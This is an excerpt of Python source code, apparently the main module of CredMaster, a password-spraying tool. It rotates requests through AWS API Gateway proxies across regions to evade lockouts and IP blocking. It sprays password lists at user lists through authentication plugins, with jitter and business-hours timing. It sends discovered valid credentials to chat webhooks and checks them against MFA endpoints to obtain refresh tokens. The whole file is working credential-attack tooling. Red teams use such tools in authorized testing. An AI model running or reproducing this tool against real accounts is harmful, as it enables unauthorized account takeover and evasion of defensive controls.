...
import utils.mfasweep as mfasweeper
...
class CredMaster(object):
    ...
    def parse_all_args(self, args):
        ...
        self.passwordsperdelay = args.passwordsperdelay or config_dict.get(
            "passwordsperdelay"
        )
        ...
        self.mfaSweep = args.mfasweep or config_dict.get("mfasweep")
        ...
        self.notify_obj = {
            ...
            or config_dict.get("discord_webhook"),
            ...
            or config_dict.get("exclude_password"),
        }

        self.access_key = args.access_key or config_dict.get("access_key")
        self.secret_access_key = args.secret_access_key or config_dict.get(
            "secret_access_key"
        )
        ...
        if self.session_token is not None and (
            self.secret_access_key is None or self.access_key is None
        ):
            self.log_entry("Session token requires access_key and secret_access_key")
            return
        if self.profile_name is not None and (
            self.access_key is not None or self.secret_access_key is not None
        ):
        ...
        if (
            ...
            and self.profile_name is None
        ):
            self.log_entry(
                "Cannot derive valid AWS authentication from passed options!"
            )
            return
    ...
    def do_input_error_handling(self):
        ...
        if self.outfile != None:
            ...
            if os.path.exists(of):
                self.log_entry(
                    f"File {of} already exists, try again with a unique file name"
                )
                sys.exit()
        ...
        if (
            ...
            self.log_entry(
                "No FireProx access arguments settings configured, add access keys/session token or fill out config file"
            )
            sys.exit()
        ...
        if self.region is not None and self.region not in self.regions:
            self.log_entry(
                f"Input region {self.region} not a supported AWS region, {self.regions}"
            )
            sys.exit()
        ...
        if self.jitter_min is not None and self.jitter is None:
            ...
            self.jitter_min is not None
            and self.jitter is not None
            and self.jitter_min >= self.jitter
        ):
        ...
        if (
            self.notify_obj["pushover_user"] is not None
            and self.notify_obj["pushover_token"] is None
        ):
            self.log_entry("pushover_user input requires pushover_token input")
            sys.exit()
        elif (
            self.notify_obj["pushover_user"] is None
            and self.notify_obj["pushover_token"] is not None
        ):
    ...
    def Execute(self, args):
        ...
        # file stuffs
        if self.userpassfile is None and (
            self.userfile is None or (self.passwordfile is None and not self.userenum)
        ):
            self.log_entry(
        ...
        try:
            ...
            connect_success, testconnect_output, pluginargs = validator.testconnect(
                pluginargs, args, self.apis[0], useragent
            )
            ...
            for password in passwords:
                ...
                if time_count == 1:
                    if self.userenum:
                        notify.notify_update(
                            "Info: Starting Userenum.", self.notify_obj
                        )
                    else:
                        notify.notify_update(
                ...
                if self.weekdaywarrior is not None:
                    ...
                    next_time = (
                        ...
                        + datetime.timedelta(hours=self.weekdaywarrior)
                        + datetime.timedelta(minutes=sleep_time)
                    )
                    self.log_entry(
                        f"Weekday Warrior, sleeping {sleep_time} minutes until {next_time.strftime('%H:%M')} on {spray_days[next_time.weekday()]} in UTC {self.weekdaywarrior}"
                    )
                ...
                for api in self.apis:
                    t = threading.Thread(
                        target=self.spray_thread, args=(api["region"], api, pluginargs)
                    )
                    threads.append(t)
                    t.start()
                ...
                if (
                    self.delay is None
                    or len(passwords) == 1
                    or password == passwords[len(passwords) - 1]
                ):
                    if self.userpassfile != None:
                        self.log_entry(
                            f"Completed spray with user-pass file {self.userpassfile} at {datetime.datetime.utcnow()}"
                        )
                    elif self.userenum:
                        self.log_entry(
                            f"Completed userenum at {datetime.datetime.utcnow()}"
                        )
                    else:
                        self.log_entry(
                            f"Completed spray with password {password} at {datetime.datetime.utcnow()}"
                        )
                    ...
                    self.log_entry(
                        f"Completed spray with password {password} at {datetime.datetime.utcnow()}, moving on to next password..."
                    )
                    continue
                else:
                    self.log_entry(
                        f"Completed spray with password {password} at {datetime.datetime.utcnow()}, sleeping for {self.delay} minutes before next password spray"
                    )
                    self.log_entry(f"Valid credentials discovered: {len(self.results)}")
                    for success in self.results:
                        self.log_entry(
                            f"Valid: {success['username']}:{success['password']}"
                        )
                    count = 0
            ...
            try:
                ...
                self.log_entry(
                    "Second KeyboardInterrupt detected, unable to clean up APIs :( try the --clean option"
                )
    ...
    def load_apis(self, url, region=None):
        ...
        for x in range(0, self.thread_count):
            ...
            self.log_entry(
                f"Created API - Region: {reg} ID: ({self.apis[x]['api_gateway_id']}) - {self.apis[x]['proxy_url']} => {url}"
            )
    ...
    def display_stats(self, start=True):
        ...
        if self.end_time and not start:
            ...
            for cred in self.results:
                sprayuser = str(cred["username"])
                spraypass = str(cred["password"])
                self.log_entry(f"VALID - {cred['username']}:{cred['password']}")
                if self.mfaSweep is not None:
                    print(f"[!] Checking {len(self.results)} Valid Account(s) for MFA...")
                    mfasweeper.mfasweep(sprayuser, spraypass, self.notify_obj)
        ...
        for region in self.regions:
            ...
            if len(active_apis) != 0:
                for api in active_apis:
                    self.log_entry(
                        f"API Info --  ID: {api['id']}, Name: {api['name']}, Created Date: {api['createdDate']}"
                    )
    ...
    def destroy_apis(self):
        ...
        for api in self.apis:
            ...
            args, help_str = self.get_fireprox_args(
                "delete", api["region"], api_id=api["api_gateway_id"]
            )
            fp = FireProx(args, help_str)
            self.log_entry(
                f"Destroying API ({args['api_id']}) in region {api['region']}"
            )
    ...
    def spray_thread(self, api_key, api_dict, pluginargs):
        ...
        try:
            plugin_authentiate = getattr(
                importlib.import_module(f"plugins.{self.plugin}.{self.plugin}"),
                f"{self.plugin}_authenticate",
            )
        ...
        while not self.q_spray.empty() and not self.cancelled:
            ...
            try:
                ...
                if response["error"]:
                    self.log_entry(
                        f"ERROR: {api_key}: {cred['username']} - {response['output']}"
                    )

                if response["result"].lower() == "success" and (
                    "userenum" not in pluginargs
                ):
                    self.results.append(
                        {"username": cred["username"], "password": cred["password"]}
                    )
                    notify.notify_success(
                        cred["username"], cred["password"], self.notify_obj
                    )
                ...
                if self.color:
                    ...
                    if response["result"].lower() == "success":
                        self.log_entry(
                            utils.prGreen(f"{api_key}: {response['output']}")
                        )

                    elif response["result"].lower() == "potential":
                        self.log_entry(
                            utils.prYellow(f"{api_key}: {response['output']}")
                        )
    ...
    def load_credentials(self, password):
        ...
        if self.userenum:
            ...
            self.log_entry(
                f"Loading credentials from {self.userfile} with password {password}{r}"
            )
            users = self.load_file(self.userfile)
        else:
            self.log_entry(
                f"Loading credentials from {self.userpassfile} as user-pass file{r}"
            )
...
if __name__ == "__main__":
    ...
    basic_args.add_argument(
        "--plugin", help="Spray plugin", default=None, required=False
    )
    basic_args.add_argument(
        "-u", "--userfile", default=None, required=False, help="Username file"
    )
    basic_args.add_argument(
        "-p", "--passwordfile", default=None, required=False, help="Password file"
    )
    basic_args.add_argument(
        "-f",
        "--userpassfile",
        default=None,
        required=False,
        help="Username-Password file (one-to-one map, colon separated)",
    )
    basic_args.add_argument(
        "-a", "--useragentfile", default=None, required=False, help="Useragent file"
    )
    ...
    adv_args.add_argument(
        ...
        default=None,
        required=False,
        help="Output file to write contents (omit extension)",
    )
    adv_args.add_argument(
        "-t",
        "--threads",
        type=int,
        default=None,
        help="Thread count (default 1, max 15)",
    )
    adv_args.add_argument(
        "--region",
        default=None,
        required=False,
        help="Specify AWS Region to create API Gateways in",
    )
    adv_args.add_argument(
        "-j",
        "--jitter",
        ...
        default=None,
        required=False,
        help="Jitter delay between requests in seconds (applies per-thread)",
    )
    adv_args.add_argument(
        "-m",
        "--jitter_min",
        ...
        default=None,
        required=False,
        help="Minimum jitter time in seconds, defaults to 0",
    )
    adv_args.add_argument(
        "-d",
        "--delay",
        ...
        default=None,
        required=False,
        help="Delay between unique passwords, in minutes",
    )
    adv_args.add_argument(
        "--passwordsperdelay",
        type=int,
        default=1,
        required=False,
        help="Number of passwords to be tested per delay cycle",
    )
    adv_args.add_argument(
        "-r",
        "--randomize",
        ...
        required=False,
        action="store_true",
        help="Randomize the input list of usernames to spray (will remain the same password)",
    )
    adv_args.add_argument(
        "--header",
        default=None,
        required=False,
        help='Add a custom header to each request for attribution, specify "X-Header: value"',
    )
    adv_args.add_argument(
        "--weekday-warrior",
        default=None,
        required=False,
        help="If you don't know what this is don't use it, input is timezone UTC offset",
    )
    adv_args.add_argument(
        "--color",
        default=False,
        action="store_true",
        required=False,
        help="Output spray results in Green/Yellow/Red colors",
    )
    adv_args.add_argument(
        "--mfasweep",
        default=None,
        action="store_true",
        required=False,
        help="Check valid creds against MFASweep endpoints and get us a valid refresh token",
    )
    ...
    notify_args.add_argument(
        ...
        type=str,
        default=None,
        help="Webhook link for Slack notifications",
    )
    notify_args.add_argument(
        "--pushover_token",
        type=str,
        default=None,
        help="Token for Pushover notifications",
    )
    notify_args.add_argument(
        "--pushover_user",
        type=str,
        default=None,
        help="User for Pushover notifications",
    )
    notify_args.add_argument(
        "--discord_webhook",
        type=str,
        default=None,
        help="Webhook link for Discord notifications",
    )
    notify_args.add_argument(
        "--teams_webhook",
        type=str,
        default=None,
        help="Webhook link for Teams notifications",
    )
    notify_args.add_argument(
        "--operator_id",
        type=str,
        default=None,
        help="Optional Operator ID for notifications",
    )
    notify_args.add_argument(
        "--exclude_password",
        default=False,
        action="store_true",
        help="Exclude discovered password in Notification message",
    )
    ...
    fp_args.add_argument(
        "--secret_access_key", type=str, default=None, help="AWS Secret Access Key"
    )
    fp_args.add_argument(
        "--session_token", type=str, default=None, help="AWS Session Token"
    )
    fp_args.add_argument(
        "--config",
        type=str,
        default=None,
        help="Authenticate to AWS using config file aws.config",
    )
    ...
    fpu_args.add_argument(
        ...
        default=False,
        action="store_true",
        help="Clean up all fireprox AWS APIs from every region, warning irreversible",
    )
    fpu_args.add_argument(
        "--api_destroy",
        type=str,
    ...
    fpu_args.add_argument(
        "--api_list", default=False, action="store_true", help="List all fireprox APIs"
    )
